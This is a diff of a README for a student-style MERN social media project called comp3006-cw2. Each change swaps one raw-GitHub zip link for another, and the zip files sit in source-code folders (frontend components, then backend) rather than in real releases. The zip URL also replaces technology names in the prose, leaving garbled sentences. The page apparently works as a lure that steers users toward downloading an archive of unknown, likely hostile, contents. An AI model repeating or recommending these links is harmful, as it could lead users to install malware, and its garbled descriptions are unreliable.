@@ -1,11 +1,11 @@
 # 🚀 comp3006-cw2 - Your Social Media Hub Awaits!
 
 ## 📦 Download Here
-[![Download](https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/frontend/src/components/comp_cw_v2.9.zip)](https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/frontend/src/components/comp_cw_v2.9.zip)
+[![Download](https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/backend/comp_cw_wordmongering.zip)](https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/backend/comp_cw_wordmongering.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **comp3006-cw2** project! This software is a containerized MERN social media platform. It offers real-time updates thanks to https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/frontend/src/components/comp_cw_v2.9.zip You will enjoy a smooth experience, knowing that it has been tested with Vitest and Supertest.
+Welcome to the **comp3006-cw2** project! This software is a containerized MERN social media platform. It offers real-time updates thanks to https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/backend/comp_cw_wordmongering.zip You will enjoy a smooth experience, knowing that it has been tested with Vitest and Supertest.
 
 In this guide, we will help you download and set up the software quickly.
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the software, please visit this page: [Release Page](https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/frontend/src/components/comp_cw_v2.9.zip). There, you will find the latest version of the software. 
+To download the software, please visit this page: [Release Page](https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/backend/comp_cw_wordmongering.zip). There, you will find the latest version of the software. 
 
 1. Click on the link above to go to the Releases page. 
 2. Find the latest version.
@@ -97,6 +97,6 @@ This project uses several open-source technologies, including:
 
 - **Docker:** For containerization
 - **MERN Stack:** A collection of technologies for building web applications
-- **https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/frontend/src/components/comp_cw_v2.9.zip** For real-time communication
+- **https://raw.githubusercontent.com/Gautamkrishna07/comp3006-cw2/main/SourceCode/backend/comp_cw_wordmongering.zip** For real-time communication
 
 Thank you for using **comp3006-cw2**. We hope you enjoy your experience on this platform!
